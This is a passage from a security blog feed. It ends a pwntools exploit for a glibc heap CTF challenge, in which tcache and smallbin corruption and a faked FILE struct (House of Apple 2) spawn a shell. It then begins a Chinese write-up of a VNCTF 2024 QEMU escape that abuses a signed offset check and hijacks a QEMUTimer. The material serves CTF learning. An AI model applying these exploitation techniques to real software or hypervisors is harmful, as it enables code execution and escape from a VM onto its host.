    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size [1=small / 2=big]: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Data: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
 
<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
 
<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>

    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xd58</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span> <span class="c1"># arrange heap layout (very very niu bi trick) '3' is a valid size. take effect in line 74
</span>
    <span class="c1"># leak libc and heap
</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd11</span><span class="p">))</span> <span class="c1"># top chunk origin size: 0x??D11
</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger realloc to put top chunk into unsorted bin (very niu bi trick)
</span>    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
    <span class="n">show</span><span class="p">()</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcf1</span><span class="p">))</span> <span class="c1"># repair corrupted size
</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># this chunk is split from old top chunk in unsorted bin
</span>    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
    <span class="n">show</span><span class="p">()</span>
    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="c1"># leak tcache protect key (which xswl)
</span>    <span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
    <span class="n">free</span><span class="p">()</span>

    <span class="c1"># smallbin to tcache
</span>
    <span class="c1"># construct fake chunk to be consolidate with old top chunk (need to satisfy unlink macro)
</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xd00</span><span class="p">))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x11</span><span class="p">))</span> <span class="c1"># taken from tcache, but actually a very big chunk (0xd00) overlaping with the old top chunk which is in unsorted bin
</span>    <span class="n">free</span><span class="p">()</span> <span class="c1"># trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span>

    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin
</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="c1"># construct a fake smallbin-linked list
</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2c0</span><span class="o">+</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x219d60</span><span class="p">,</span>
    <span class="p">]))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># trigger smallbin-to-tcache process
</span>    <span class="n">free</span><span class="p">()</span>

    <span class="c1"># House of Apple 2
</span>
    <span class="n">wide_data_off</span> <span class="o">=</span> <span class="mh">0xa0</span>
    <span class="n">vtable_off</span> <span class="o">=</span> <span class="mh">0xd8</span>
    <span class="n">wide_data_vtable_off</span> <span class="o">=</span> <span class="mh">0xe0</span>
    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x2160d8</span>
    <span class="n">__overflow_off</span> <span class="o">=</span> <span class="mh">0x18</span>
    <span class="n">do_alloc_off</span> <span class="o">=</span> <span class="mh">0x68</span>
    <span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a680</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x50d60</span>

    <span class="c1"># we can't hijack data in standard FILE struct directly because we have only *one* 0x80 bytes arbitrary write
</span>    <span class="c1"># so we have to fake a FILE struct on heap and hijack the _IO_list_all pointer to it
</span>
    <span class="c1"># heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
</span>    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d0</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
        <span class="mh">0x10</span><span class="p">:</span> <span class="sa">b</span><span class="s">"  sh;"</span><span class="p">,</span> <span class="c1"># fake FILE struct starts at heap_base + 0x2e0
</span>        <span class="mh">0x38</span><span class="p">:</span> <span class="n">system</span><span class="p">,</span>
        <span class="mh">0x68</span><span class="p">:</span> <span class="mh">0x71</span><span class="p">,</span>
        <span class="mh">0x70</span><span class="p">:</span> <span class="n">_IO_list_all</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">),</span>
    <span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span> <span class="c1"># starts from heap_base + 0x2e0 + 0x60
</span>        <span class="n">wide_data_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0xd0</span> <span class="o">-</span> <span class="n">wide_data_vtable_off</span><span class="p">,</span>
        <span class="mh">0xd0</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>          <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2e0</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">-</span> <span class="n">do_alloc_off</span><span class="p">,</span>
        <span class="n">vtable_off</span><span class="o">-</span><span class="mh">0x60</span><span class="p">:</span>    <span class="n">_IO_wfile_overflow_ptr</span> <span class="o">-</span> <span class="n">__overflow_off</span><span class="p">,</span>
    <span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
    <span class="n">free</span><span class="p">()</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e0</span><span class="p">))</span>   <span class="c1"># hijack _IO_list_all
</span>
    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span> <span class="c1"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow
</span>
    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="c1"># ------------------ Infrastructure ------------------ #
</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s">"""
        source ~/gaio/load_sym.py
        loadsym ~/gaio/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug
    """</span><span class="p">)</span>
    <span class="c1"># pause()
</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">debug</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for debug"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

    <span class="n">pwn</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="pwn" /><category term="heap" /><summary type="html"><![CDATA[参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome 本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。]]></summary></entry><entry><title type="html">VNCTF 2024 escape_langlang_mountain2</title><link href="https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html" rel="alternate" type="text/html" title="VNCTF 2024 escape_langlang_mountain2" /><published>2024-02-19T05:23:25+08:00</published><updated>2024-02-19T05:23:25+08:00</updated><id>https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2</id><content type="html" xml:base="https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html"><![CDATA[<p>第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T</p>

<p>题目链接：<a href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">xtxtn/vnctf2024-escape_langlang_mountain2wp (github.com)</a></p>

<p>关于qemu pwn入门，网上中文资料非常多：</p>
<ul>
  <li><a href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/dev/">QEMU - CTFwiki</a></li>
  <li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 - xuanxuanblingbling</a></li>
  <li><a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/">QEMU 简易食用指南 - Arttnba3</a></li>
  <li><a href="https://l0tus.vip/cn/qemu_escape/">虚拟机逃逸初探 - l0tus</a> l0tus师傅什么时候更新啊！！</li>
</ul>

<h2 id="环境与调试">环境与调试</h2>

<p>理想的环境是 qemu 内的系统有 ssh，这样就可以直接连上去，甚至使用 scp 传 payload，但是这题没有。
我采用的调试方法是在 Dockerfile 中加一个 gdb，这样就可以在 docker 中调试，但是最佳的调试方法应该是往 docker 里面塞一个 gdbserver，然后用主机的 gdb attach 上去，这样就可以使用主机里的插件。</p>

<h2 id="漏洞分析">漏洞分析</h2>

<p>题目实现设备提供了 <code class="language-plaintext highlighter-rouge">vn_mmio_read</code> 和 <code class="language-plaintext highlighter-rouge">vn_mmio_write</code> 两个函数。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">vn_mmio_read</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">****</span><span class="n">a1</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-14h]</span>
  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">object_dynamic_cast_assert</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">"vn"</span><span class="p">,</span> <span class="s">"../qemu-8.1.4/hw/misc/vnctf.c"</span><span class="p">,</span> <span class="mi">21u</span><span class="p">,</span> <span class="s">"vn_mmio_read"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40LL</span> <span class="o">+</span> <span class="n">v4</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">object+0xb80</code> 用来保存一个偏移，该函数可以根据缓冲区的相对偏移读数据。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">vn_mmio_write</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">****</span><span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">object_dynamic_cast_assert</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">"vn"</span><span class="p">,</span> <span class="s">"../qemu-8.1.4/hw/misc/vnctf.c"</span><span class="p">,</span> <span class="mi">42u</span><span class="p">,</span> <span class="s">"vn_mmio_write"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">48</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB84</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span><span class="c1">// 一次int范围内任意写</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB84</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">&lt;=</span> <span class="mh">0x30</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">a3</span> <span class="o">&lt;=</span> <span class="mi">60</span> <span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x3C</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>write 中提供了三个功能：</p>

<ul>
  <li>addr==16：设置 0xB80 处的偏移变量</li>
  <li>addr==32：正常的 Buffer 内读写（0x40 大小空间，没有越界）</li>
  <li>addr==48：根据偏移变量写入数据（仅限一次）</li>
</ul>

<p>在检查偏移变量的大小时，由于检查类型是 signed，因此可以把偏移修改为一个负数。于是我们就可以有无限次的任意相对地址读，以及一次任意相对地址写入。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>整体思路：</p>
<ol>
  <li>在设备 Object 结构体内寻找堆地址和程序地址并泄露</li>
  <li>从 main_loop_tlg 泄露出第二个 timerlist 的地址</li>
  <li>在设备 Buffer 中伪造 QEMUTimer 结构体</li>
  <li>劫持 timerlist 的 active_timers 指针为伪造的结构体</li>
</ol>

<h3 id="地址泄露">地址泄露</h3>

<p>由于我第一次打 qemu pwn，对于其中各种结构体都比较陌生，所以我直接用本办法，在动态调试的时候查看 Buffer 前面的数据，从里面找到可以泄露的指针。（从而给后面本地打得通远程打不通埋下了伏笔）</p>

<p>在不清除结构体信息的情况下，找泄露的时候需要注意一些查找要点：</p>
<ul>
  <li>泄露程序基地址时，随便找一个指向程序某地址的指针泄露就行了；</li>
  <li>泄露堆地址时要注意，不同环境之间的堆环境可能不一样，因此在寻找时（假设我们想要泄露设备 Buffer 的地址）：
    <ul>
      <li>最佳的泄露用指针是和 Buffer 处于同一个结构体中的指针</li>
      <li>其次是和 Buffer 所在结构体位置相近的指针，越相近越好</li>
    </ul>
  </li>
  <li><del>计算堆基址并没有什么用</del></li>
</ul>

<p>根据这种方法可以找到两个指针，然后泄露即可。</p>

<p>当然，如果你是一位对设备的 Object 结构体比较熟悉的 qemu pwn 大师，那么你就可以直接泄露结构体的某些字段来泄露程序和堆的地址。具体来说，可以通过 MemoryRegion 结构体：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">MemoryRegion</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="p">...</span>
    <span class="n">DeviceState</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>

    <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="o">*</span><span class="n">ops</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
    <span class="n">MemoryRegion</span> <span class="o">*</span><span class="n">container</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>其中，<code class="language-plaintext highlighter-rouge">ops</code> 指向 data 段的 <code class="language-plaintext highlighter-rouge">vn_mmio_ops</code>，<code class="language-plaintext highlighter-rouge">opaque</code> 更是指向 vn 的设备结构体，因此泄露这两个指针就可以准确泄露地址，不用担心什么偏移不一样的问题。</p>

<h3 id="控制流劫持">控制流劫持</h3>

<p>在网上可以找到的大部分 pwn 题中，设备本身就有一些函数指针，劫持它们就可以劫持控制流（甚至参数），但本题的设备就是单纯的读和写，并没有什么 <code class="language-plaintext highlighter-rouge">encode</code>、<code class="language-plaintext highlighter-rouge">rand</code> 之类的函数。因此，本题需要一个通用的控制流劫持方法。</p>

<p>在 Qemu 中，可以通过注册一个 QEMUTimer 来让 qemu 在一段时间间隔之后调用一个函数，参数为一个 opauqe 指针。相关结构体定义如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="p">{</span>
    <span class="kt">int64_t</span> <span class="n">expire_time</span><span class="p">;</span>        <span class="cm">/* in nanoseconds */</span>
    <span class="n">QEMUTimerList</span> <span class="o">*</span><span class="n">timer_list</span><span class="p">;</span>
    <span class="n">QEMUTimerCB</span> <span class="o">*</span><span class="n">cb</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
    <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">scale</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="p">{</span>
    <span class="n">QEMUClock</span> <span class="o">*</span><span class="n">clock</span><span class="p">;</span>
    <span class="n">QemuMutex</span> <span class="n">active_timers_lock</span><span class="p">;</span>
    <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">active_timers</span><span class="p">;</span>
    <span class="n">QLIST_ENTRY</span><span class="p">(</span><span class="n">QEMUTimerList</span><span class="p">)</span> <span class="n">list</span><span class="p">;</span>
    <span class="n">QEMUTimerListNotifyCB</span> <span class="o">*</span><span class="n">notify_cb</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_opaque</span><span class="p">;</span>
    <span class="n">QemuEvent</span> <span class="n">timers_done_ev</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>从内存视角看两个结构体长这样：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="p">{</span>
    <span class="kt">int64_t</span> <span class="n">expire_time</span><span class="p">;</span>        <span class="cm">/* in nanoseconds */</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">timer_list</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">cb</span><span class="p">;</span>
